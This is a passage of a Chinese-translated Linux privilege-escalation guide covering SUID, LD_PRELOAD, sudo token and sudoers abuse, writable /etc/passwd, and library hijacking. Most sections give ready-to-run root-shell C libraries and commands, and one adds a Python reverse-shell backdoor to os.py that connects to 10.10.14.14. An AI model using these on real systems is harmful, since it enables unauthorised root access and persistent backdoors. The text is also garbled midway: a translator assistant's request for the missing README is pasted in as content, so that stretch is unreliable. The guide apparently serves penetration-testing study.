如果该 **suid** 二进制文件 **在执行另一个命令时指定了路径**，那么你可以尝试 **导出一个函数**，其名称与 suid 文件所调用的命令相同。

例如，如果一个 suid 二进制调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建该函数并将其导出：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 suid 二进制时，这个函数将被执行

### LD_PRELOAD & **LD_LIBRARY_PATH**

环境变量 **LD_PRELOAD** 用于指定一个或多个共享库（.so 文件），由加载器在其它库之前加载，包括标准 C 库（`libc.so`）。这个过程称为预加载库。

然而，为了维护系统安全并防止该功能被滥用，特别是在具有 **suid/sgid** 的可执行文件上，系统会强制执行某些条件：

- 对于真实用户 ID (_ruid_) 与 有效用户 ID (_euid_) 不匹配的可执行文件，加载器会忽略 **LD_PRELOAD**。
- 对于具有 suid/sgid 的可执行文件，只有位于标准路径且同样为 suid/sgid 的库会被预加载。

如果你可以使用 `sudo` 执行命令，并且 `sudo -l` 的输出包含 **env_keep+=LD_PRELOAD**，则可能发生权限提升。该配置允许 **LD_PRELOAD** 环境变量在使用 `sudo` 运行命令时仍然保留并被识别，从而可能导致以提升的权限执行任意代码。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后 **将其编译** 使用:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，**escalate privileges** 正在运行
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制了 **LD_LIBRARY_PATH** 环境变量，也可以滥用类似的 privesc，因为这样他们就能控制库被搜索的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

当遇到具有 **SUID** 权限且看起来异常的二进制时，最好检查它是否正确加载 **.so** 文件。可以通过运行以下命令来检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到像 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 这样的错误，表明存在潜在的利用可能性。

要利用这一点，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
该代码在被编译并执行后，旨在通过修改文件权限并以提升的权限启动 shell 来获得更高权限。

将上述 C 文件编译为 shared object (.so) 文件，使用：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最终，运行受影响的 SUID 二进制文件应触发该 exploit，从而可能导致系统被攻破。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经发现一个 SUID binary，会从我们可以写入的文件夹加载库，接下来在该文件夹中创建具有必要名称的库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果你遇到类似的错误：
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的库需要有一个名为 `a_function_name` 的函数。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个收录可被攻击者利用以绕过本地安全限制的 Unix 二进制文件的精选列表。[**GTFOArgs**](https://gtfoargs.github.io/) 用途相同，但针对只能**注入参数**到命令中的情况。

该项目收集了 Unix 二进制文件的合法功能，这些功能可以被滥用以突破受限 shell、提升或维持提权、传输文件、生成 bind 和 reverse shells，以及辅助其它 post-exploitation 任务。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，可以使用工具 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 来检查它是否能发现利用任何 sudo 规则的方法。

### 重用 sudo 令牌

在你拥有 **sudo access** 但不知道密码的情况下，可以通过**等待某次 sudo 命令执行然后劫持会话令牌**来提升权限。

提升权限的前提条件：

- 你已经以用户 "_sampleuser_" 拥有一个 shell
- "_sampleuser_" 在**最近 15 分钟内**已经**使用过 `sudo`** 执行过某些操作（默认情况下这是 sudo 令牌允许我们在不输入任何密码的情况下使用 `sudo` 的持续时间）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的值为 0
- `gdb` 可用（你能够上传它）

（你可以临时启用 `ptrace_scope`：`echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope`，或通过修改 `/etc/sysctl.d/10-ptrace.conf` 并设置 `kernel.yama.ptrace_scope = 0` 来永久修改）

如果满足所有这些条件，**你可以使用：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject) 来提升权限

- 第一个 **exploit**（`exploit.sh`）会在 _/tmp_ 中创建二进制文件 `activate_sudo_token`。你可以用它来**在你的会话中激活 sudo 令牌**（这不会自动给你一个 root shell，执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **第二个 exploit** (`exploit_v2.sh`) 会在 _/tmp_ 创建一个 sh shell **由 root 拥有并带有 setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- 第三个 **exploit** (`exploit_v3.sh`) 会 **创建一个 sudoers 文件**，使 **sudo tokens 永久有效 并允许所有用户 使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或其内部任何已创建文件拥有**写权限**，你可以使用二进制文件 [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 来**为某个用户和 PID 创建 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且你以该用户身份拥有 PID 为 1234 的 shell，你可以在不需要知道密码的情况下通过以下方式**获得 sudo privileges**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

文件 `/etc/sudoers` 和 `/etc/sudoers.d` 目录下的文件负责配置谁可以使用 `sudo` 以及如何使用。 这些文件**默认只有用户 root 和组 root 可以读取**.\
**如果**你能**读取**该文件，你可能能够**获得一些有趣的信息**，如果你能**写入**任何文件，你将能够**escalate privileges**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你有写权限，就可以滥用此权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 二进制文件的工具，比如 OpenBSD 的 `doas`，记得检查其配置文件（位于 `/etc/doas.conf`）。
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

如果你知道某个 **用户通常连接到机器并使用 `sudo`** 来提升权限，并且你已经在该用户上下文中获得了一个 shell，你可以**创建一个新的 sudo 可执行文件**，该文件会先以 root 身份执行你的代码，然后再执行用户的命令。然后，**修改该用户上下文的 $PATH**（例如在 .bash_profile 中添加新的路径），这样当用户执行 sudo 时，你的 sudo 可执行文件就会被执行。

注意，如果用户使用不同的 shell（不是 bash），你需要修改其他文件以添加新的路径。例如[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) 会修改 `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`。你可以在 [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) 找到另一个示例。

或者运行类似如下的命令：
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## 共享库

### ld.so

文件 `/etc/ld.so.conf` 指示 **加载的配置文件来自哪里**。通常，该文件包含以下路径：`include /etc/ld.so.conf.d/*.conf`

这意味着会读取 `/etc/ld.so.conf.d/*.conf` 中的配置文件。该配置文件 **指向其他文件夹**，系统将在这些文件夹中 **搜索库**。例如，`/etc/ld.so.conf.d/libc.conf` 的内容是 `/usr/local/lib`。**这意味着系统会在 `/usr/local/lib` 中搜索库**。

如果某种原因 **用户对以下任一路径具有写权限**：`/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、`/etc/ld.so.conf.d/` 中的任意文件，或 `/etc/ld.so.conf.d/*.conf` 所指定配置文件中引用的任意文件夹，那么他可能能够提权。\
在下列页面中查看 **如何利用此错误配置**：

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
通过将 lib 复制到 `/var/tmp/flag15/`，它将按照 `RPATH` 变量中指定的位置被程序使用。
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
然后在 `/var/tmp` 创建一个恶意库，使用 `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## 能力

Linux capabilities 提供给进程一个 **可用 root 权限的子集**。这实际上将 root 的 **权限划分为更小且独立的单元**。这些单元可以被独立授予给不同的进程。通过这种方式，完整的权限集合被缩减，从而降低被利用的风险。\
阅读以下页面以 **了解更多关于 capabilities 及如何滥用它们**：

{{#ref}}
linux-capabilities.md
{{#endref}}

## 目录权限

在目录中，**bit for "execute"** 表示受影响的用户可以 "**cd**" 进入该文件夹。\
**"read"** 位表示用户可以 **list** 这些 **files**，而 **"write"** 位表示用户可以 **delete** 并 **create** 新的 **files**。

## ACLs

Access Control Lists (ACLs) 代表可裁量权限的第二层，能够**覆盖传统的 ugo/rwx permissions**。这些权限通过允许或拒绝对非所有者或非组成员的特定用户的访问权来增强对文件或目录访问的控制。这个级别的**粒度确保了更精确的访问管理**。更多细节可见 [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**授予** 用户 "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**获取** 系统中具有特定 ACLs 的文件：
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## 打开 shell 会话

在 **旧版本** 中，你可能能够 **hijack** 不同用户（**root**）的某些 **shell** 会话。\
在 **最新版本** 中，你只能 **connect** 到属于 **your own user** 的 screen sessions。不过，你可能会在会话中发现 **有趣的信息**。

### screen sessions hijacking

**列出 screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**附加到 session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

这是 **old tmux versions** 的一个问题。  
我作为非特权用户无法劫持由 root 创建的 tmux (v2.1) 会话。

**列出 tmux 会话**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**附加到会话**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

在 2006 年 9 月到 2008 年 5 月 13 日之间，在基于 Debian 的系统（Ubuntu、Kubuntu 等）上生成的所有 SSL 和 SSH 密钥可能受此漏洞影响。\
该漏洞在这些操作系统上创建新的 ssh key 时产生，原因是 **只有 32,768 种变体**。这意味着可以穷举所有可能，并且 **拥有 ssh public key 就可以搜索对应的 private key**。你可以在此处找到预计算的可能性： [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** 指定是否允许 password authentication。默认值为 `no`。
- **PubkeyAuthentication:** 指定是否允许 public key authentication。默认值为 `yes`。
- **PermitEmptyPasswords**: 当允许 password authentication 时，指定服务器是否允许使用空密码字符串的账户登录。默认值为 `no`。

### PermitRootLogin

指定 root 是否可以使用 ssh 登录，默认值为 `no`。可能的值：

- `yes`: root 可以使用 password 和 private key 登录
- `without-password` or `prohibit-password`: root 只能使用 private key 登录
- `forced-commands-only`: root 只能使用 private key 登录，并且仅当指定了 commands 选项时
- `no` : 不允许

### AuthorizedKeysFile

指定包含可用于用户认证的 public keys 的文件。它可以包含像 `%h` 这样的 token，%h 将被替换为主目录。**你可以指定绝对路径**（以 `/` 开头）或 **从用户主目录的相对路径**。例如:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
该配置表示，如果你尝试使用用户 "**testusername**" 的 **private** key 登录，ssh 将会将你的公钥与位于 `/home/testusername/.ssh/authorized_keys` 和 `/home/testusername/access` 的公钥进行比较。

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding 允许你 **使用本地 SSH keys 而不是将 keys**（without passphrases!）放在你的服务器上。这样，你将能够通过 ssh **跳转** **到某台主机**，然后从那里 **再跳转到另一台** 主机，**使用** 位于你 **初始主机** 的 **key**。

你需要在 `$HOME/.ssh.config` 中像下面这样设置此选项：
```
Host example.com
ForwardAgent yes
```
注意，如果 `Host` 是 `*`，每次用户跳转到不同主机时，该主机都能够访问密钥（这是一个安全问题）。

文件 `/etc/ssh_config` 可以 **覆盖** 这些 **选项** 并允许或拒绝该配置。\
文件 `/etc/sshd_config` 可以使用关键字 `AllowAgentForwarding` **允许** 或 **拒绝** ssh-agent forwarding（默认是允许）。

如果你发现环境中配置了 Forward Agent，请阅读以下页面，因为 **你可能能够滥用它来提升权限**：


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## 有趣的文件

### Profiles files

文件 `/etc/profile` 以及 `/etc/profile.d/` 下的文件是 **在用户启动新 shell 时执行的脚本**。因此，如果你能 **写入或修改其中任何一个文件，你就可以提升权限**。
```bash
ls -l /etc/profile /etc/profile.d/
```
如果发现任何异常的 profile 脚本，应该检查其中是否包含**敏感信息**。

### Passwd/Shadow 文件

根据操作系统的不同，`/etc/passwd` 和 `/etc/shadow` 文件的名称可能有所不同，或者可能存在备份。因此建议**找到所有这些文件**并**检查是否可以读取**它们，以查看文件中**是否包含哈希**：
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
在某些情况下，你可以在 `/etc/passwd`（或等价文件）中找到 **password hashes**。
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### 可写的 /etc/passwd

首先，使用下面任一命令生成一个密码。
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
我没有收到 src/linux-hardening/privilege-escalation/README.md 的内容。请把该 README.md 的原文粘贴出来，我会按要求把英语内容翻译成中文并保留所有原有的 markdown/HTML 语法、路径和标签不变。

另外，请确认下面两点：
1) 你要我在翻译后的文档中“添加用户 hacker 并加入生成的密码”是指仅在翻译文本内附加一段说明（例如一行或一个小节，显示用户名和明文密码），还是要把创建用户的命令也写进文档？（注意：我不能在你的主机上实际创建用户，只能在文档中添加说明/命令示例。）
2) 是否现在就为该用户生成一个强密码并把这个明文密码写入翻译后的 README？如果是，请确认你接受明文密码出现在文档中（明文密码有安全风险）。

确认后请粘贴 README.md 内容并回复上述偏好，我会开始翻译并按指定格式添加用户和密码。
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
例如: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

你现在可以使用 `su` 命令并使用 `hacker:hacker`

或者，你可以使用以下行来添加一个没有密码的虚拟用户。\\ 警告：这可能会降低当前机器的安全性。
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
注意：在 BSD 平台上 `/etc/passwd` 位于 `/etc/pwd.db` 和 `/etc/master.passwd`，同时 `/etc/shadow` 被重命名为 `/etc/spwd.db`。

你应该检查是否可以 **写入一些敏感文件**。例如，你能否写入某些 **服务配置文件**？
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
例如，如果机器正在运行 **tomcat** 服务器并且你可以 **修改位于 /etc/systemd/ 中的 Tomcat 服务配置文件，** 那么你可以修改以下行：
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
你的后门将在下次 tomcat 启动时被执行。

### 检查文件夹

下列文件夹可能包含备份或有趣的信息： **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (你可能无法读取最后一个，但可以尝试)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### 奇怪的位置/Owned 文件
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### 最近几分钟内修改的文件
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB 文件
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml 文件
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### 隐藏文件
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH 中的脚本/二进制文件**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web 文件**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **备份**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### 已知包含 passwords 的文件

查看 [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) 的代码，它会搜索 **几类可能包含 passwords 的文件**。\
**另一个有趣的工具** 是：[**LaZagne**](https://github.com/AlessandroZ/LaZagne)，它是一个开源程序，用于检索存储在本地计算机上的大量 passwords（适用于 Windows、Linux & Mac）。

### Logs

如果你能读取 logs，你可能会在其中发现 **有趣/机密 信息**。日志越异常，可能越有价值（可能）。\
此外，一些配置 **“bad”** 的（被植入后门？）**audit logs** 可能允许你在 audit logs 中 **记录 passwords**，正如这篇文章所述： [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
为了 **读取日志的组** [**adm**](interesting-groups-linux-pe/index.html#adm-group) 会非常有用。

### Shell 文件
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

你还应该检查文件名或内容中包含单词 "**password**" 的文件，也要检查日志中是否包含 IPs 和 emails，或 hashes regexps。\
我不会在这里列出所有如何执行这些操作，但如果你感兴趣可以查看 [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) 执行的最后几项检查。

## Writable files

### Python library hijacking

如果你知道 python 脚本将从 **哪里** 被执行，并且你 **可以在该文件夹内写入** 或者你可以 **modify python libraries**，你就可以修改 OS library 并 backdoor it（如果你可以写入 python 脚本将被执行的位置，复制并粘贴 os.py library）。

要 **backdoor the library**，只需在 os.py library 的末尾添加以下行（更改 IP 和 PORT）：
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

一个 `logrotate` 的漏洞允许对日志文件或其父目录拥有 **写权限** 的用户可能获得提权。这是因为 `logrotate` 通常以 **root** 身份运行，可以被操纵去执行任意文件，尤其是在像 _**/etc/bash_completion.d/**_ 这样的目录中。重要的不仅要检查 _/var/log_ 的权限，还要检查任何被应用日志轮替的目录的权限。

> [!TIP]
> 此漏洞影响 `logrotate` 版本 `3.18.0` 及更早版本

关于该漏洞的更多详细信息可见此页面： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 来利用此漏洞。

该漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** 非常相似，所以每当你发现可以修改日志时，检查谁在管理这些日志，并检查是否可以通过将日志替换为 symlinks 来提升权限。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果出于任何原因，用户能够向 _/etc/sysconfig/network-scripts_ **写入** 一个 `ifcf-<whatever>` 脚本，或者能够 **调整** 一个已存在的脚本，那么你的 **system is pwned**。

网络脚本，例如 _ifcg-eth0_，用于网络连接。它们看起来完全像 .INI 文件。然而，它们在 Linux 上被 Network Manager (dispatcher.d) \~sourced\~。

在我的情况下，这些网络脚本中的 `NAME=` 属性没有被正确处理。如果名称中有 **空白/空格，系统会尝试执行空白/空格之后的部分**。这意味着 **第一个空格之后的所有内容都会以 root 身份执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 Network 和 /bin/id 之间的空格_)

### **init、init.d、systemd 和 rc.d**

目录 `/etc/init.d` 存放 System V init (SysVinit) 的 **脚本**，这是经典的 Linux 服务管理系统。该目录包含用于 `start`、`stop`、`restart`，有时还有 `reload` 服务的脚本。这些脚本可以直接执行，或通过位于 `/etc/rc?.d/` 的符号链接来调用。在 Redhat 系统中，另一个可选路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 关联，Upstart 是由 Ubuntu 引入的较新的 **服务管理** 系统，使用配置文件来管理服务。尽管已向 Upstart 迁移，由于 Upstart 中的兼容层，SysVinit 脚本仍然与 Upstart 配置一起被使用。

**systemd** 是一种现代的初始化和服务管理器，提供诸如按需启动守护进程、自动挂载管理和系统状态快照等高级功能。它将文件组织在 `/usr/lib/systemd/`（用于发行版包）和 `/etc/systemd/system/`（用于管理员的自定义）中，从而简化系统管理流程。

## 其他技巧

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. 了解更多及利用细节见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
